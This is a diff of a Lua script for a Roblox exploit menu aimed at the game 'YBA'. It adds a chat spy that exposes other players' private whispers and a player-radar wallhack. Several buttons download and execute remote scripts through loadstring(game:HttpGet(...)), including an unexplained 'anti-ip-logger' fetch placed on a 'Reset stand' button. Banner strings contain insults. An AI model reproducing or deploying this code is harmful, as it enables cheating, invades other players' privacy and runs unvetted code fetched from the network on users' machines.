@@ -72,13 +72,15 @@ local FuctSyn_2 = Instance.new("ScrollingFrame")
 local B1_3 = Instance.new("TextButton")
 local LB1_3 = Instance.new("TextLabel")
 local LB2_3 = Instance.new("TextLabel")
-local B2_3 = Instance.new("TextButton")
+local B3_2 = Instance.new("TextButton")
 local FuctSyn_3 = Instance.new("TextButton")
+local B2_3 = Instance.new("TextButton")
+local LB3_2 = Instance.new("TextLabel")
 
 --Properties:
 
 iRo2pfgEUI.Name = "iRo2pfgEUI"
-iRo2pfgEUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+iRo2pfgEUI.Parent = game.CoreGui
 iRo2pfgEUI.ResetOnSpawn = false
 
 UI.Name = "UI"
@@ -257,7 +259,7 @@ Announce_2.Position = UDim2.new(0.0698689967, 0, 0, 0)
 Announce_2.Size = UDim2.new(0, 176, 0, 28)
 Announce_2.ZIndex = 9
 Announce_2.Font = Enum.Font.Gotham
-Announce_2.Text = "Compra synapse pobre culiao"
+Announce_2.Text = "Chupalo mati qlio lloron"
 Announce_2.TextColor3 = Color3.fromRGB(255, 255, 255)
 Announce_2.TextSize = 12.000
 Announce_2.TextXAlignment = Enum.TextXAlignment.Left
@@ -375,7 +377,6 @@ Fuct2_2.BorderSizePixel = 0
 Fuct2_2.Size = UDim2.new(0, 285, 0, 296)
 Fuct2_2.Visible = false
 Fuct2_2.ZIndex = 3
-Fuct2_2.CanvasPosition = Vector2.new(0, 546)
 Fuct2_2.CanvasSize = UDim2.new(0, 0, 2, 250)
 Fuct2_2.ScrollBarThickness = 8
 
@@ -509,13 +510,11 @@ LB8.TextSize = 14.000
 
 B7.Name = "B7"
 B7.Parent = Fuct2_2
-B7.Active = false
-B7.BackgroundColor3 = Color3.fromRGB(182, 82, 82)
+B7.BackgroundColor3 = Color3.fromRGB(113, 182, 136)
 B7.BorderSizePixel = 0
 B7.Position = UDim2.new(0.0909999982, 0, 0.61500001, 0)
 B7.Size = UDim2.new(0, 32, 0, 32)
 B7.ZIndex = 3
-B7.AutoButtonColor = false
 B7.Font = Enum.Font.SourceSans
 B7.Text = ""
 B7.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -576,11 +575,11 @@ LB7.Parent = Fuct2_2
 LB7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 LB7.BackgroundTransparency = 0.900
 LB7.BorderSizePixel = 0
-LB7.Position = UDim2.new(0.231000006, 0, 0.616175711, 0)
-LB7.Size = UDim2.new(0, 87, 0, 32)
+LB7.Position = UDim2.new(0.227491289, 0, 0.614256561, 0)
+LB7.Size = UDim2.new(0, 79, 0, 32)
 LB7.ZIndex = 3
 LB7.Font = Enum.Font.Gotham
-LB7.Text = "Boost fps"
+LB7.Text = "Spy chat"
 LB7.TextColor3 = Color3.fromRGB(255, 255, 255)
 LB7.TextSize = 14.000
 
@@ -853,7 +852,7 @@ FuctSyn_2.Parent = Selector
 FuctSyn_2.Active = true
 FuctSyn_2.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
 FuctSyn_2.BorderSizePixel = 0
-FuctSyn_2.Position = UDim2.new(1, 0, -0.00337837846, 0)
+FuctSyn_2.Position = UDim2.new(1, 0, 0, 0)
 FuctSyn_2.Size = UDim2.new(0, 285, 0, 296)
 FuctSyn_2.ZIndex = 3
 FuctSyn_2.CanvasSize = UDim2.new(0, 0, 1, 22)
@@ -897,17 +896,17 @@ LB2_3.Text = "Spy fuctions"
 LB2_3.TextColor3 = Color3.fromRGB(255, 255, 255)
 LB2_3.TextSize = 14.000
 
-B2_3.Name = "B2"
-B2_3.Parent = FuctSyn_2
-B2_3.BackgroundColor3 = Color3.fromRGB(113, 182, 136)
-B2_3.BorderSizePixel = 0
-B2_3.Position = UDim2.new(0.0947368443, 0, 0.1875, 0)
-B2_3.Size = UDim2.new(0, 32, 0, 32)
-B2_3.ZIndex = 3
-B2_3.Font = Enum.Font.SourceSans
-B2_3.Text = ""
-B2_3.TextColor3 = Color3.fromRGB(0, 0, 0)
-B2_3.TextSize = 14.000
+B3_2.Name = "B3"
+B3_2.Parent = FuctSyn_2
+B3_2.BackgroundColor3 = Color3.fromRGB(113, 182, 136)
+B3_2.BorderSizePixel = 0
+B3_2.Position = UDim2.new(0.0947368443, 0, 0.31249997, 0)
+B3_2.Size = UDim2.new(0, 32, 0, 32)
+B3_2.ZIndex = 3
+B3_2.Font = Enum.Font.SourceSans
+B3_2.Text = ""
+B3_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+B3_2.TextSize = 14.000
 
 FuctSyn_3.Name = "FuctSyn"
 FuctSyn_3.Parent = FuctSyn_2
@@ -924,9 +923,34 @@ FuctSyn_3.TextColor3 = Color3.fromRGB(255, 255, 255)
 FuctSyn_3.TextSize = 14.000
 FuctSyn_3.TextStrokeColor3 = Color3.fromRGB(166, 255, 161)
 
+B2_3.Name = "B2"
+B2_3.Parent = FuctSyn_2
+B2_3.BackgroundColor3 = Color3.fromRGB(113, 182, 136)
+B2_3.BorderSizePixel = 0
+B2_3.Position = UDim2.new(0.0947368443, 0, 0.1875, 0)
+B2_3.Size = UDim2.new(0, 32, 0, 32)
+B2_3.ZIndex = 3
+B2_3.Font = Enum.Font.SourceSans
+B2_3.Text = ""
+B2_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+B2_3.TextSize = 14.000
+
+LB3_2.Name = "LB3"
+LB3_2.Parent = FuctSyn_2
+LB3_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LB3_2.BackgroundTransparency = 0.900
+LB3_2.BorderSizePixel = 0
+LB3_2.Position = UDim2.new(0.231578946, 0, 0.311791092, 0)
+LB3_2.Size = UDim2.new(0, 98, 0, 32)
+LB3_2.ZIndex = 3
+LB3_2.Font = Enum.Font.Gotham
+LB3_2.Text = "Player radar"
+LB3_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+LB3_2.TextSize = 14.000
+
 -- Scripts:
 
-local function AYIXS_fake_script() -- WelcomeName.LocalScript 
+local function FAEUA_fake_script() -- WelcomeName.LocalScript 
 	local script = Instance.new('LocalScript', WelcomeName)
 
 	local Label = script.Parent.Parent.WelcomeName
@@ -934,8 +958,8 @@ local function AYIXS_fake_script() -- WelcomeName.LocalScript
 	Label.Text = plrName
 	
 end
-coroutine.wrap(AYIXS_fake_script)()
-local function NPVWI_fake_script() -- Fuct1.LocalScript 
+coroutine.wrap(FAEUA_fake_script)()
+local function GMZLMLM_fake_script() -- Fuct1.LocalScript 
 	local script = Instance.new('LocalScript', Fuct1)
 
 	button = script.Parent.Parent.Fuct1
@@ -953,8 +977,8 @@ local function NPVWI_fake_script() -- Fuct1.LocalScript
 	
 	end)
 end
-coroutine.wrap(NPVWI_fake_script)()
-local function GLPAU_fake_script() -- Fuct2.LocalScript 
+coroutine.wrap(GMZLMLM_fake_script)()
+local function GLKMTQB_fake_script() -- Fuct2.LocalScript 
 	local script = Instance.new('LocalScript', Fuct2)
 
 	button = script.Parent.Parent.Fuct2
@@ -972,8 +996,8 @@ local function GLPAU_fake_script() -- Fuct2.LocalScript
 		
 	end)
 end
-coroutine.wrap(GLPAU_fake_script)()
-local function UJPQLJC_fake_script() -- Fuct3.LocalScript 
+coroutine.wrap(GLKMTQB_fake_script)()
+local function RLCLHOV_fake_script() -- Fuct3.LocalScript 
 	local script = Instance.new('LocalScript', Fuct3)
 
 	button = script.Parent.Parent.Fuct3
@@ -991,21 +1015,22 @@ local function UJPQLJC_fake_script() -- Fuct3.LocalScript
 	
 	end)
 end
-coroutine.wrap(UJPQLJC_fake_script)()
-local function SQHE_fake_script() -- Close.LocalScript 
+coroutine.wrap(RLCLHOV_fake_script)()
+local function RXRRUF_fake_script() -- Close.LocalScript 
 	local script = Instance.new('LocalScript', Close)
 
 	button = script.Parent.Parent.Close
 	Gui = script.Parent.Parent.Parent.Parent.Parent.UI
+	UI = script.Parent.Parent.Parent.Parent.Parent.Parent.iRo2pfgEUI
 	
 	button.MouseButton1Click:Connect(function()
 		Gui:TweenPosition(UDim2.new(2, 0,0, 0), 'Out', 'Bounce', 2)
 		wait(3)
-		Gui:Destroy()
+		UI:Destroy()
 	end)
 end
-coroutine.wrap(SQHE_fake_script)()
-local function XVVAPG_fake_script() -- UI.LocalScript 
+coroutine.wrap(RXRRUF_fake_script)()
+local function JFFHL_fake_script() -- UI.LocalScript 
 	local script = Instance.new('LocalScript', UI)
 
 	local UserInputService = game:GetService("UserInputService")
@@ -1048,8 +1073,8 @@ local function XVVAPG_fake_script() -- UI.LocalScript
 		end
 	end)
 end
-coroutine.wrap(XVVAPG_fake_script)()
-local function SLNHFX_fake_script() -- Close_2.LocalScript 
+coroutine.wrap(JFFHL_fake_script)()
+local function MUTABNQ_fake_script() -- Close_2.LocalScript 
 	local script = Instance.new('LocalScript', Close_2)
 
 	Announce = script.Parent.Parent.Parent.Announce
@@ -1059,8 +1084,8 @@ local function SLNHFX_fake_script() -- Close_2.LocalScript
 		Announce:TweenPosition(UDim2.new(0.372, 0,-0.095, 0), 'Out', 1)
 	end)
 end
-coroutine.wrap(SLNHFX_fake_script)()
-local function ZPIG_fake_script() -- UI.AnimUI 
+coroutine.wrap(MUTABNQ_fake_script)()
+local function HXGK_fake_script() -- UI.AnimUI 
 	local script = Instance.new('LocalScript', UI)
 
 	-- {-0.333, 0},{0, 0}
@@ -1084,8 +1109,8 @@ local function ZPIG_fake_script() -- UI.AnimUI
 		FontSize = Enum.FontSize.Size14;    
 	})
 end
-coroutine.wrap(ZPIG_fake_script)()
-local function RFJQG_fake_script() -- Avatar.LocalScript 
+coroutine.wrap(HXGK_fake_script)()
+local function UYBSYME_fake_script() -- Avatar.LocalScript 
 	local script = Instance.new('LocalScript', Avatar)
 
 	local Players = game:GetService("Players")
@@ -1103,8 +1128,8 @@ local function RFJQG_fake_script() -- Avatar.LocalScript
 	imageLabel.Image = content
 	imageLabel.Size = UDim2.new(0, 48, 0, 48)
 end
-coroutine.wrap(RFJQG_fake_script)()
-local function KFOYI_fake_script() -- B10.LocalScript 
+coroutine.wrap(UYBSYME_fake_script)()
+local function AWCQ_fake_script() -- B10.LocalScript 
 	local script = Instance.new('LocalScript', B10)
 
 	button = script.Parent.Parent.B10
@@ -1119,8 +1144,8 @@ local function KFOYI_fake_script() -- B10.LocalScript
 	
 		
 end
-coroutine.wrap(KFOYI_fake_script)()
-local function LIHS_fake_script() -- B9.LocalScript 
+coroutine.wrap(AWCQ_fake_script)()
+local function LVQPS_fake_script() -- B9.LocalScript 
 	local script = Instance.new('LocalScript', B9)
 
 	button = script.Parent.Parent.B9
@@ -1143,36 +1168,20 @@ local function LIHS_fake_script() -- B9.LocalScript
 	
 		
 end
-coroutine.wrap(LIHS_fake_script)()
-local function RIAPR_fake_script() -- B8.LocalScript 
+coroutine.wrap(LVQPS_fake_script)()
+local function ZVNOFNM_fake_script() -- B8.LocalScript 
 	local script = Instance.new('LocalScript', B8)
 
 	button = script.Parent.Parent.B8
 	button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/68656c702e/anti-ip-logger/main/main.lua", true))()
 		game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Reset stand", Text = "error"})
-		for _,v in pairs(workspace:GetDescendants()) do
-			if v.ClassName == "Part"
-				or v.ClassName == "SpawnLocation"
-				or v.ClassName == "WedgePart"
-				or v.ClassName == "Terrain"
-				or v.ClassName == "MeshPart" then
-				v.BrickColor = BrickColor.new(155, 155, 155)
-				v.Material = "Plastic"
-			end
-		end
-	
-		for _,v in pairs(workspace:GetDescendants()) do
-			if v.ClassName == "Decal"
-				or v.ClassName == "Texture" then
-				v:Destroy()
-			end
-		end
 	end)
 	
 		
 end
-coroutine.wrap(RIAPR_fake_script)()
-local function PLCLCY_fake_script() -- FuctSyn.LocalScript 
+coroutine.wrap(ZVNOFNM_fake_script)()
+local function YVZWIWT_fake_script() -- FuctSyn.LocalScript 
 	local script = Instance.new('LocalScript', FuctSyn)
 
 	--{0.011, 0},{0, 0}
@@ -1189,8 +1198,8 @@ local function PLCLCY_fake_script() -- FuctSyn.LocalScript
 	end)
 	
 end
-coroutine.wrap(PLCLCY_fake_script)()
-local function KEEIKT_fake_script() -- B11.LocalScript 
+coroutine.wrap(YVZWIWT_fake_script)()
+local function HDIC_fake_script() -- B11.LocalScript 
 	local script = Instance.new('LocalScript', B11)
 
 	button = script.Parent.Parent.B10
@@ -1217,10 +1226,56 @@ local function KEEIKT_fake_script() -- B11.LocalScript
 	
 		
 end
-coroutine.wrap(KEEIKT_fake_script)()
--- B7.LocalScript is disabled.
+coroutine.wrap(HDIC_fake_script)()
+local function BEZXF_fake_script() -- B7.LocalScript 
+	local script = Instance.new('LocalScript', B7)
+
+	button = script.Parent.Parent.B7
+	button.MouseButton1Click:Connect(function()
+		game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Spy chat", Text = "Option 7 has be enabled"})
+		local Players, SGui = game:GetService("Players"), game:GetService("StarterGui");
+		local Client, NColor3, UD, UD2 = Players.LocalPlayer, Color3.new, UDim.new, UDim2.new
+	
+		local function ChatSpy()
+			local ChatSpyFrame = Client.PlayerGui.Chat.Frame
+			ChatSpyFrame.ChatChannelParentFrame.Visible = true
+			ChatSpyFrame.ChatBarParentFrame.Position = ChatSpyFrame.ChatChannelParentFrame.Position + UD2(UD(), ChatSpyFrame.ChatChannelParentFrame.Size.Y)
+		end
+		ChatSpy()
+	
+		getgenv().ShowHiddenMsg = function(T, C)
+			SGui:SetCore("ChatMakeSystemMessage", {
+				Text = T;
+				Color = C;
+			})
+		end
+		getgenv().Spy = function(Target)
+			Target.Chatted:Connect(function(Msg)
+				if string.find(Msg, "/e ") or string.find(Msg, "/w ") or string.find(Msg, "/whisper ") then
+					ShowHiddenMsg("{YBA-SPY}: ".."["..tostring(Target).."]: "..Msg, NColor3(255,255,255)) -- https://www.rapidtables.com/web/color/RGB_Color.html if you want to change the color of the hidden msg's
+				end
+			end)
+		end
+	
+		local GP = Players:GetPlayers()
+		for i = 1, #GP do
+			local Plr = GP[i]
+			if tostring(Plr) then
+				Spy(Plr)
+			end
+		end
+		Players.PlayerAdded:Connect(function(P)
+			if tostring(P) then
+				Spy(P)
+			end
+		end)
+	end)
+	
+		
+end
+coroutine.wrap(BEZXF_fake_script)()
 -- B6.LocalScript is disabled.
-local function QERUIM_fake_script() -- B5.LocalScript 
+local function UXPLYTT_fake_script() -- B5.LocalScript 
 	local script = Instance.new('LocalScript', B5)
 
 	button = script.Parent.Parent.B5
@@ -1231,8 +1286,8 @@ local function QERUIM_fake_script() -- B5.LocalScript
 	
 	
 end
-coroutine.wrap(QERUIM_fake_script)()
-local function TPESM_fake_script() -- B4.LocalScript 
+coroutine.wrap(UXPLYTT_fake_script)()
+local function POSTRY_fake_script() -- B4.LocalScript 
 	local script = Instance.new('LocalScript', B4)
 
 	button = script.Parent.Parent.B4
@@ -1342,8 +1397,8 @@ local function TPESM_fake_script() -- B4.LocalScript
 		end)
 	end)
 end
-coroutine.wrap(TPESM_fake_script)()
-local function YBIJ_fake_script() -- B3.LocalScript 
+coroutine.wrap(POSTRY_fake_script)()
+local function MHDKVA_fake_script() -- B3.LocalScript 
 	local script = Instance.new('LocalScript', B3)
 
 	button = script.Parent.Parent.B3
@@ -1352,8 +1407,8 @@ local function YBIJ_fake_script() -- B3.LocalScript
 	end)
 		
 end
-coroutine.wrap(YBIJ_fake_script)()
-local function MXMYXD_fake_script() -- B2.LocalScript 
+coroutine.wrap(MHDKVA_fake_script)()
+local function ZUWVXUM_fake_script() -- B2.LocalScript 
 	local script = Instance.new('LocalScript', B2)
 
 	button = script.Parent.Parent.B2
@@ -1362,8 +1417,8 @@ local function MXMYXD_fake_script() -- B2.LocalScript
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/kolgie/YBA-GUI/main/yba-gui-obfuscated.lua"))()
 	end)
 end
-coroutine.wrap(MXMYXD_fake_script)()
-local function NUFGEJ_fake_script() -- B1.LocalScript 
+coroutine.wrap(ZUWVXUM_fake_script)()
+local function SAAIVGO_fake_script() -- B1.LocalScript 
 	local script = Instance.new('LocalScript', B1)
 
 	button = script.Parent.Parent.B1
@@ -1385,8 +1440,8 @@ local function NUFGEJ_fake_script() -- B1.LocalScript
 	
 	
 end
-coroutine.wrap(NUFGEJ_fake_script)()
-local function JBUCU_fake_script() -- B1_2.LocalScript 
+coroutine.wrap(SAAIVGO_fake_script)()
+local function QBKP_fake_script() -- B1_2.LocalScript 
 	local script = Instance.new('LocalScript', B1_2)
 
 	button = script.Parent.Parent.B1
@@ -1407,8 +1462,8 @@ local function JBUCU_fake_script() -- B1_2.LocalScript
 	
 	
 end
-coroutine.wrap(JBUCU_fake_script)()
-local function UPGWBO_fake_script() -- Avatar_2.LocalScript 
+coroutine.wrap(QBKP_fake_script)()
+local function LCYTX_fake_script() -- Avatar_2.LocalScript 
 	local script = Instance.new('LocalScript', Avatar_2)
 
 	local Players = game:GetService("Players")
@@ -1426,8 +1481,8 @@ local function UPGWBO_fake_script() -- Avatar_2.LocalScript
 	imageLabel.Image = content
 	imageLabel.Size = UDim2.new(0, 48, 0, 48)
 end
-coroutine.wrap(UPGWBO_fake_script)()
-local function GBYO_fake_script() -- Username.LocalScript 
+coroutine.wrap(LCYTX_fake_script)()
+local function BOUTJID_fake_script() -- Username.LocalScript 
 	local script = Instance.new('LocalScript', Username)
 
 	local Label = script.Parent.Parent.Username
@@ -1435,8 +1490,8 @@ local function GBYO_fake_script() -- Username.LocalScript
 	Label.Text = plrName
 	
 end
-coroutine.wrap(GBYO_fake_script)()
-local function MDDHN_fake_script() -- ID.LocalScript 
+coroutine.wrap(BOUTJID_fake_script)()
+local function LZYQ_fake_script() -- ID.LocalScript 
 	local script = Instance.new('LocalScript', ID)
 
 	local Label = script.Parent.Parent.ID
@@ -1444,8 +1499,8 @@ local function MDDHN_fake_script() -- ID.LocalScript
 	Label.Text = plrId.UserId
 	
 end
-coroutine.wrap(MDDHN_fake_script)()
-local function JVVSXO_fake_script() -- RemoveData.LocalScript 
+coroutine.wrap(LZYQ_fake_script)()
+local function UAFMTT_fake_script() -- RemoveData.LocalScript 
 	local script = Instance.new('LocalScript', RemoveData)
 
 	button = script.Parent.Parent.RemoveData
@@ -1459,8 +1514,8 @@ local function JVVSXO_fake_script() -- RemoveData.LocalScript
 		avatar.Image = "http://www.roblox.com/asset/?id=6915618307"
 	end)
 end
-coroutine.wrap(JVVSXO_fake_script)()
-local function TLLBVZ_fake_script() -- B2_2.LocalScript 
+coroutine.wrap(UAFMTT_fake_script)()
+local function OUYKEP_fake_script() -- B2_2.LocalScript 
 	local script = Instance.new('LocalScript', B2_2)
 
 	button = script.Parent.Parent.B2
@@ -1480,41 +1535,222 @@ local function TLLBVZ_fake_script() -- B2_2.LocalScript
 	
 	
 end
-coroutine.wrap(TLLBVZ_fake_script)()
-local function GQVIZVP_fake_script() -- B1_3.LocalScript 
+coroutine.wrap(OUYKEP_fake_script)()
+local function NEPZWZW_fake_script() -- B1_3.LocalScript 
 	local script = Instance.new('LocalScript', B1_3)
 
 	button = script.Parent.Parent.B1
 	button.MouseButton1Click:Connect(function()
+		game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Ultra item esp", Text = "Synapse option 1 has be enabled"})
 		loadstring(game:HttpGet("https://gist.githubusercontent.com/Chrrxs/d2dfdcde75c2d11b173aa664c0a6b755/raw", true))()
 	end)
 	
 	
 end
-coroutine.wrap(GQVIZVP_fake_script)()
-local function QATKTQE_fake_script() -- B2_3.LocalScript 
-	local script = Instance.new('LocalScript', B2_3)
+coroutine.wrap(NEPZWZW_fake_script)()
+local function ADEUXMX_fake_script() -- B3_2.LocalScript 
+	local script = Instance.new('LocalScript', B3_2)
 
 	button = script.Parent.Parent.B1
 	button.MouseButton1Click:Connect(function()
-		local Player = game.Players.LocalPlayer
+		game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Player radar", Text = "Synapse option 3 has be enabled"})
+		local Players = game:service("Players")
+		local Player = Players.LocalPlayer
+		local Mouse = Player:GetMouse()
+		local Camera = game:service("Workspace").CurrentCamera
+		local RS = game:service("RunService")
+		local UIS = game:service("UserInputService")
 	
-		while true do 
-			for _,v in pairs(game.Workspace:GetChildren()) do
-				if v.Name:find("'s Horse") and not v.Name:find(Player.Name) then
-					pcall(function()
-						v.RemoteEvent:FireServer("Dismount")
-					end)
-				end
-			end
-			wait(1)
+		repeat wait() until Player.Character ~= nil and Player.Character.PrimaryPart ~= nil
+	
+		local LerpColorModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/Blissful4992/ESPs/main/LerpColorModule.lua"))()
+		local HealthBarLerp = LerpColorModule:Lerp(Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0))
+	
+		local function NewCircle(Transparency, Color, Radius, Filled, Thickness)
+			local c = Drawing.new("Circle")
+			c.Transparency = Transparency
+			c.Color = Color
+			c.Visible = false
+			c.Thickness = Thickness
+			c.Position = Vector2.new(0, 0)
+			c.Radius = Radius
+			c.NumSides = math.clamp(Radius*55/100, 10, 75)
+			c.Filled = Filled
+			return c
 		end
+	
+		local RadarInfo = {
+			Position = Vector2.new(200, 200),
+			Radius = 100,
+			Scale = 1, -- Determinant factor on the effect of the relative position for the 2D integration
+			RadarBack = Color3.fromRGB(10, 10, 10),
+			RadarBorder = Color3.fromRGB(75, 75, 75),
+			LocalPlayerDot = Color3.fromRGB(255, 255, 255),
+			PlayerDot = Color3.fromRGB(60, 170, 255),
+			Team = Color3.fromRGB(0, 255, 0),
+			Enemy = Color3.fromRGB(255, 0, 0),
+			Health_Color = true,
+			Team_Check = true
+		}
+	
+		local RadarBackground = NewCircle(0.9, RadarInfo.RadarBack, RadarInfo.Radius, true, 1)
+		RadarBackground.Visible = true
+		RadarBackground.Position = RadarInfo.Position
+	
+		local RadarBorder = NewCircle(0.75, RadarInfo.RadarBorder, RadarInfo.Radius, false, 3)
+		RadarBorder.Visible = true
+		RadarBorder.Position = RadarInfo.Position
+	
+		local function GetRelative(pos)
+			local char = Player.Character
+			if char ~= nil and char.PrimaryPart ~= nil then
+				local pmpart = char.PrimaryPart
+				local camerapos = Vector3.new(Camera.CFrame.Position.X, pmpart.Position.Y, Camera.CFrame.Position.Z)
+				local newcf = CFrame.new(pmpart.Position, camerapos)
+				local r = newcf:PointToObjectSpace(pos)
+				return r.X, r.Z
+			else
+				return 0, 0
+			end
+		end
+	
+		local function PlaceDot(plr)
+			local PlayerDot = NewCircle(1, RadarInfo.PlayerDot, 3, true, 1)
+	
+			local function Update()
+				local c 
+				c = game:service("RunService").RenderStepped:Connect(function()
+					local char = plr.Character
+					if char and char:FindFirstChildOfClass("Humanoid") and char.PrimaryPart ~= nil and char:FindFirstChildOfClass("Humanoid").Health > 0 then
+						local hum = char:FindFirstChildOfClass("Humanoid")
+						local scale = RadarInfo.Scale
+						local relx, rely = GetRelative(char.PrimaryPart.Position)
+						local newpos = RadarInfo.Position - Vector2.new(relx * scale, rely * scale) 
+	
+						if (newpos - RadarInfo.Position).magnitude < RadarInfo.Radius-2 then 
+							PlayerDot.Radius = 3   
+							PlayerDot.Position = newpos
+							PlayerDot.Visible = true
+						else 
+							local dist = (RadarInfo.Position - newpos).magnitude
+							local calc = (RadarInfo.Position - newpos).unit * (dist - RadarInfo.Radius)
+							local inside = Vector2.new(newpos.X + calc.X, newpos.Y + calc.Y)
+							PlayerDot.Radius = 2
+							PlayerDot.Position = inside
+							PlayerDot.Visible = true
+						end
+	
+						PlayerDot.Color = RadarInfo.PlayerDot
+						if RadarInfo.Team_Check then
+							if plr.TeamColor == Player.TeamColor then
+								PlayerDot.Color = RadarInfo.Team
+							else
+								PlayerDot.Color = RadarInfo.Enemy
+							end
+						end
+	
+						if RadarInfo.Health_Color then
+							PlayerDot.Color = HealthBarLerp(hum.Health / hum.MaxHealth)
+						end
+					else 
+						PlayerDot.Visible = false
+						if Players:FindFirstChild(plr.Name) == nil then
+							PlayerDot:Remove()
+							c:Disconnect()
+						end
+					end
+				end)
+			end
+			coroutine.wrap(Update)()
+		end
+	
+		for _,v in pairs(Players:GetChildren()) do
+			if v.Name ~= Player.Name then
+				PlaceDot(v)
+			end
+		end
+	
+		local function NewLocalDot()
+			local d = Drawing.new("Triangle")
+			d.Visible = true
+			d.Thickness = 1
+			d.Filled = true
+			d.Color = RadarInfo.LocalPlayerDot
+			d.PointA = RadarInfo.Position + Vector2.new(0, -6)
+			d.PointB = RadarInfo.Position + Vector2.new(-3, 6)
+			d.PointC = RadarInfo.Position + Vector2.new(3, 6)
+			return d
+		end
+	
+		local LocalPlayerDot = NewLocalDot()
+	
+		Players.PlayerAdded:Connect(function(v)
+			if v.Name ~= Player.Name then
+				PlaceDot(v)
+			end
+			LocalPlayerDot:Remove()
+			LocalPlayerDot = NewLocalDot()
+		end)
+	
+		-- Loop
+		coroutine.wrap(function()
+			local c 
+			c = game:service("RunService").RenderStepped:Connect(function()
+				if LocalPlayerDot ~= nil then
+					LocalPlayerDot.Color = RadarInfo.LocalPlayerDot
+					LocalPlayerDot.PointA = RadarInfo.Position + Vector2.new(0, -6)
+					LocalPlayerDot.PointB = RadarInfo.Position + Vector2.new(-3, 6)
+					LocalPlayerDot.PointC = RadarInfo.Position + Vector2.new(3, 6)
+				end
+				RadarBackground.Position = RadarInfo.Position
+				RadarBackground.Radius = RadarInfo.Radius
+				RadarBackground.Color = RadarInfo.RadarBack
+	
+				RadarBorder.Position = RadarInfo.Position
+				RadarBorder.Radius = RadarInfo.Radius
+				RadarBorder.Color = RadarInfo.RadarBorder
+			end)
+		end)()
+	
+		-- Draggable
+		local inset = game:service("GuiService"):GetGuiInset()
+	
+		local dragging = false
+		local offset = Vector2.new(0, 0)
+		UIS.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 and (Vector2.new(Mouse.X, Mouse.Y + inset.Y) - RadarInfo.Position).magnitude < RadarInfo.Radius then
+				offset = RadarInfo.Position - Vector2.new(Mouse.X, Mouse.Y)
+				dragging = true
+			end
+		end)
+	
+		UIS.InputEnded:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 then
+				dragging = false
+			end
+		end)
+	
+		coroutine.wrap(function()
+			local dot = NewCircle(1, Color3.fromRGB(255, 255, 255), 3, true, 1)
+			local c 
+			c = game:service("RunService").RenderStepped:Connect(function()
+				if (Vector2.new(Mouse.X, Mouse.Y + inset.Y) - RadarInfo.Position).magnitude < RadarInfo.Radius then
+					dot.Position = Vector2.new(Mouse.X, Mouse.Y + inset.Y)
+					dot.Visible = true
+				else 
+					dot.Visible = false
+				end
+				if dragging then
+					RadarInfo.Position = Vector2.new(Mouse.X, Mouse.Y) + offset
+				end
+			end)
+		end)()
 	end)
 	
 	
 end
-coroutine.wrap(QATKTQE_fake_script)()
-local function HEKRIJ_fake_script() -- FuctSyn_3.LocalScript 
+coroutine.wrap(ADEUXMX_fake_script)()
+local function PTYBB_fake_script() -- FuctSyn_3.LocalScript 
 	local script = Instance.new('LocalScript', FuctSyn_3)
 
 	--{0.011, 0},{0, 0}
@@ -1528,8 +1764,20 @@ local function HEKRIJ_fake_script() -- FuctSyn_3.LocalScript
 	end)
 	
 end
-coroutine.wrap(HEKRIJ_fake_script)()
-local function XQJUB_fake_script() -- UI.Toggle 
+coroutine.wrap(PTYBB_fake_script)()
+local function PUHWU_fake_script() -- B2_3.LocalScript 
+	local script = Instance.new('LocalScript', B2_3)
+
+	button = script.Parent.Parent.B1
+	button.MouseButton1Click:Connect(function()
+		game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Spy fuctions", Text = "Synapse option 2 has be enabled"})
+		print("Failed to load spy fuctions.")
+	end)
+	
+	
+end
+coroutine.wrap(PUHWU_fake_script)()
+local function MTVLD_fake_script() -- UI.Toggle 
 	local script = Instance.new('LocalScript', UI)
 
 	local toggle = true
@@ -1551,4 +1799,4 @@ local function XQJUB_fake_script() -- UI.Toggle
 	
 	game.ContextActionService:BindAction("keyPress", onKeyPress, false, Enum.KeyCode.P)
 end
-coroutine.wrap(XQJUB_fake_script)()
+coroutine.wrap(MTVLD_fake_script)()
